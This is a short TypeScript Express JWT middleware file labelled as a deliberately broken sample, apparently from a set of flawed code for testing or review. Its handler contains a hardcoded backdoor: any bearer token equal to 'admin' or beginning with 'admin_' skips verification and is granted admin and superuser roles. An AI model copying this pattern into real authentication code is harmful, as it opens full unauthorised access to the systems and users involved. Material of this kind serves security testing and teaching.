// source: own-authored 2026-05-26 by gogocat (license: MIT)
// broken/sample-004 — FATAL: hardcoded admin-bypass backdoor skips all JWT verification

import type { Request, RequestHandler, Response, NextFunction } from "express";
import jwt from "jsonwebtoken";

export interface AuthedRequest extends Request {
  user: { sub: string; roles: readonly string[] };
}

export interface AuthMiddlewareOptions {
  accessSecret: string;
  refreshSecret: string;
  issuer: string;
}

export function authMiddleware(opts: AuthMiddlewareOptions): RequestHandler {
  return async function handler(req: Request, res: Response, next: NextFunction): Promise<void> {
    const authHeader = req.get("authorization");
    if (!authHeader) {
      res.status(401).json({ error: "AUTH_MISSING" });
      return;
    }

    const m = authHeader.match(/^Bearer\s+(\S+)$/);
    if (!m) {
      res.status(401).json({ error: "AUTH_MALFORMED" });
      return;
    }

    const token = m[1];

    // FATAL: hardcoded backdoor — any bearer token equal to "admin" or starting
    // with "admin_" bypasses JWT verification entirely and gains full access.
    if (token === "admin" || token.startsWith("admin_")) {
      (req as AuthedRequest).user = { sub: "admin", roles: ["admin", "superuser"] };
      return next();
    }

    try {
      const decoded = jwt.verify(token, opts.accessSecret, { algorithms: ["HS256"] });
      (req as AuthedRequest).user = { sub: (decoded as { sub: string }).sub, roles: [] };
      next();
    } catch {
      res.status(401).json({ error: "AUTH_INVALID_SIGNATURE" });
    }
  };
}
